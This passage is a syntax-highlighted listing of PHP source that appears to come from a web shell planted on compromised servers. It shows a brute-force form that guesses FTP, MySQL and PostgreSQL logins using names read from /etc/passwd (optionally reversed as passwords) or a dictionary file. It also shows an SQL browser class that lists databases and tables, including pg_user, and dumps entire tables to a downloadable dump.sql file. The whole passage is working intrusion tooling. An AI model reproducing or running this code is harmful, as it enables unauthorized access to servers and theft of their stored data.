<span class="lineno">1047</span>                         <span class="nv">$success</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno">1048</span>                         <span class="k">echo</span> <span class="s1">&#39;&lt;b&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/b&gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1049</span>                     <span class="p">}</span> 
<span class="lineno">1050</span>                 <span class="p">}</span> 
<span class="lineno">1051</span>         <span class="p">}</span> 
<span class="lineno">1052</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;span&gt;Attempts:&lt;/span&gt; </span><span class="si">$attempts</span><span class="s2"> &lt;span&gt;Success:&lt;/span&gt; </span><span class="si">$success</span><span class="s2">&lt;/div&gt;&lt;br&gt;&quot;</span><span class="p">;</span> 
<span class="lineno">1053</span>     <span class="p">}</span> 
<span class="lineno">1054</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1055</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&#39;</span> 
<span class="lineno">1056</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=c value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1057</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=a value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1058</span>         <span class="o">.</span><span class="s1">&#39;&lt;input type=hidden name=charset value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&#39;</span> 
<span class="lineno">1059</span>         <span class="o">.</span><span class="s1">&#39;&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1060</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=server value=&quot;127.0.0.1&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1061</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1062</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;1&quot; checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1063</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style=&quot;padding-left:15px&quot;&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1064</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value=&quot;2&quot;&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1065</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style=&quot;padding-left:15px&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1066</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=login value=&quot;komsen&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;</span> 
<span class="lineno">1067</span>         <span class="o">.</span><span class="s1">&#39;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;&#39;</span> 
<span class="lineno">1068</span>         <span class="o">.</span><span class="s1">&#39;&lt;td&gt;&lt;input type=text name=dict value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;passwd.dic&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span> 
<span class="lineno">1069</span>         <span class="o">.</span><span class="s1">&#39;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1070</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno">1071</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno">1072</span> <span class="p">}</span> 
<span class="lineno">1073</span> 
<span class="lineno">1074</span> <span class="k">function</span> <span class="nf">actionSql</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1075</span>     <span class="k">class</span> <span class="nc">DbClass</span> <span class="p">{</span> 
<span class="lineno">1076</span>         <span class="k">var</span> <span class="nv">$type</span><span class="p">;</span> 
<span class="lineno">1077</span>         <span class="k">var</span> <span class="nv">$link</span><span class="p">;</span> 
<span class="lineno">1078</span>         <span class="k">var</span> <span class="nv">$res</span><span class="p">;</span> 
<span class="lineno">1079</span>         <span class="k">function</span> <span class="nf">DbClass</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1080</span>             <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span> 
<span class="lineno">1081</span>         <span class="p">}</span> 
<span class="lineno">1082</span>         <span class="k">function</span> <span class="nf">connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">){</span> 
<span class="lineno">1083</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1084</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1085</span>                     <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$user</span><span class="p">,</span><span class="nv">$pass</span><span class="p">,</span><span class="k">true</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1086</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1087</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1088</span>                     <span class="nv">$host</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="nv">$host</span><span class="p">);</span> 
<span class="lineno">1089</span>                     <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="mi">5432</span><span class="p">;</span> 
<span class="lineno">1090</span>                     <span class="k">if</span><span class="p">(</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> port=</span><span class="si">{</span><span class="nv">$host</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2"> user=</span><span class="si">$user</span><span class="s2"> password=</span><span class="si">$pass</span><span class="s2"> dbname=</span><span class="si">$dbname</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1091</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1092</span>             <span class="p">}</span> 
<span class="lineno">1093</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1094</span>         <span class="p">}</span> 
<span class="lineno">1095</span>         <span class="k">function</span> <span class="nf">selectdb</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1096</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1097</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1098</span>                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">))</span><span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
<span class="lineno">1099</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1100</span>             <span class="p">}</span> 
<span class="lineno">1101</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1102</span>         <span class="p">}</span> 
<span class="lineno">1103</span>         <span class="k">function</span> <span class="nf">query</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1104</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1105</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1106</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1107</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1108</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1109</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_query</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1110</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1111</span>             <span class="p">}</span> 
<span class="lineno">1112</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1113</span>         <span class="p">}</span> 
<span class="lineno">1114</span>         <span class="k">function</span> <span class="nf">fetch</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1115</span>             <span class="nv">$res</span> <span class="o">=</span> <span class="nb">func_num_args</span><span class="p">()</span><span class="o">?</span><span class="nb">func_get_arg</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">:</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span><span class="p">;</span> 
<span class="lineno">1116</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1117</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1118</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1119</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1120</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1121</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1122</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1123</span>             <span class="p">}</span> 
<span class="lineno">1124</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1125</span>         <span class="p">}</span> 
<span class="lineno">1126</span>         <span class="k">function</span> <span class="nf">listDbs</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1127</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1128</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1129</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_list_dbs</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1130</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1131</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1132</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;SELECT datname FROM pg_database&quot;</span><span class="p">);</span> 
<span class="lineno">1133</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1134</span>             <span class="p">}</span> 
<span class="lineno">1135</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1136</span>         <span class="p">}</span> 
<span class="lineno">1137</span>         <span class="k">function</span> <span class="nf">listTables</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1138</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1139</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1140</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW TABLES&#39;</span><span class="p">);</span> 
<span class="lineno">1141</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1142</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1143</span>                     <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s2">&quot;select table_name from information_schema.tables where (table_schema != &#39;information_schema&#39; AND table_schema != &#39;pg_catalog&#39;) or table_name = &#39;pg_user&#39;&quot;</span><span class="p">);</span> 
<span class="lineno">1144</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1145</span>             <span class="p">}</span> 
<span class="lineno">1146</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1147</span>         <span class="p">}</span> 
<span class="lineno">1148</span>         <span class="k">function</span> <span class="nf">error</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno">1149</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1150</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1151</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1152</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1153</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1154</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_last_error</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1155</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1156</span>             <span class="p">}</span> 
<span class="lineno">1157</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1158</span>         <span class="p">}</span> 
<span class="lineno">1159</span>         <span class="k">function</span> <span class="nf">setCharset</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1160</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1161</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1162</span>                     <span class="k">if</span><span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mysql_set_charset&#39;</span><span class="p">))</span> 
<span class="lineno">1163</span>                         <span class="k">return</span> <span class="o">@</span><span class="nb">mysql_set_charset</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">);</span> 
<span class="lineno">1164</span>                     <span class="k">else</span> 
<span class="lineno">1165</span>                         <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SET CHARSET &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1166</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1167</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1168</span>                     <span class="k">return</span> <span class="o">@</span><span class="nb">pg_set_client_encoding</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">link</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span> 
<span class="lineno">1169</span>                     <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1170</span>             <span class="p">}</span> 
<span class="lineno">1171</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1172</span>         <span class="p">}</span> 
<span class="lineno">1173</span>         <span class="k">function</span> <span class="nf">dump</span><span class="p">(</span><span class="nv">$table</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1174</span>             <span class="k">switch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">)</span>    <span class="p">{</span> 
<span class="lineno">1175</span>                 <span class="k">case</span> <span class="s1">&#39;mysql&#39;</span><span class="o">:</span> 
<span class="lineno">1176</span>                     <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SHOW CREATE TABLE `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span> 
<span class="lineno">1177</span>                     <span class="nv">$create</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span> 
<span class="lineno">1178</span>                     <span class="k">echo</span> <span class="nv">$create</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1179</span>                     <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;`&#39;</span><span class="p">);</span> 
<span class="lineno">1180</span>                     <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1181</span>                         <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno">1182</span>                         <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1183</span>                             <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.@</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1184</span>                             <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span> 
<span class="lineno">1185</span>                         <span class="p">}</span> 
<span class="lineno">1186</span>                     <span class="k">echo</span> <span class="s1">&#39;INSERT INTO `&#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39;` (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1187</span>                     <span class="p">}</span> 
<span class="lineno">1188</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1189</span>                 <span class="k">case</span> <span class="s1">&#39;pgsql&#39;</span><span class="o">:</span> 
<span class="lineno">1190</span>                     <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="p">);</span> 
<span class="lineno">1191</span>                     <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">())</span> <span class="p">{</span> 
<span class="lineno">1192</span>                         <span class="nv">$columns</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> 
<span class="lineno">1193</span>                         <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1194</span>                             <span class="nv">$item</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span> 
<span class="lineno">1195</span>                             <span class="nv">$columns</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> 
<span class="lineno">1196</span>                         <span class="p">}</span> 
<span class="lineno">1197</span>                     <span class="k">echo</span> <span class="s1">&#39;INSERT INTO &#39;</span><span class="o">.</span><span class="nv">$table</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$columns</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;) VALUES (&#39;</span><span class="o">.</span><span class="nb">implode</span><span class="p">(</span><span class="s2">&quot;, &quot;</span><span class="p">,</span> <span class="nv">$item</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno">1198</span>                     <span class="p">}</span> 
<span class="lineno">1199</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno">1200</span>             <span class="p">}</span> 
<span class="lineno">1201</span>             <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
<span class="lineno">1202</span>         <span class="p">}</span> 
<span class="lineno">1203</span>     <span class="p">};</span> 
<span class="lineno">1204</span>     <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DbClass</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]);</span> 
<span class="lineno">1205</span>     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno">1206</span>         <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span> 
<span class="lineno">1207</span>         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">connect</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_host&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_login&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_pass&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1208</span>         <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">selectdb</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sql_base&#39;</span><span class="p">]);</span> 
<span class="lineno">1209</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=dump.sql&quot;</span><span class="p">);</span> 
<span class="lineno">1210</span>         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span> 
<span class="lineno">1211</span>         <span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno">1212</span>                 <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dump</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span> 
<span class="lineno">1213</span>         <span class="k">exit</span><span class="p">;</span> 
<span class="lineno">1214</span>     <span class="p">}</span> 
<span class="lineno">1215</span>     <span class="nx">printHeader</span><span class="p">();</span> 
<span class="lineno">1216</span>     <span class="cp">?&gt;</span><span class="x"> </span>
<span class="lineno">1217</span> <span class="x">    &lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt; </span>
<span class="lineno">1218</span> <span class="x">    &lt;form name=&quot;sf&quot; method=&quot;post&quot;&gt; </span>
<span class="lineno">1219</span> <span class="x">        &lt;table cellpadding=&quot;2&quot; cellspacing=&quot;0&quot;&gt; </span>
<span class="lineno">1220</span> <span class="x">            &lt;tr&gt; </span>
<span class="lineno">1221</span> <span class="x">                &lt;td&gt;Type&lt;/td&gt; </span>
<span class="lineno">1222</span> <span class="x">                &lt;td&gt;Host&lt;/td&gt; </span>
<span class="lineno">1223</span> <span class="x">                &lt;td&gt;Login&lt;/td&gt; </span>
<span class="lineno">1224</span> <span class="x">                &lt;td&gt;Password&lt;/td&gt; </span>
<span class="lineno">1225</span> <span class="x">                &lt;td&gt;Database&lt;/td&gt; </span>
<span class="lineno">1226</span> <span class="x">                &lt;td&gt;&lt;/td&gt; </span>
<span class="lineno">1227</span> <span class="x">            &lt;/tr&gt; </span>
<span class="lineno">1228</span> <span class="x">            &lt;tr&gt; </span>
<span class="lineno">1229</span> <span class="x">                &lt;input type=hidden name=a value=Sql&gt; </span>
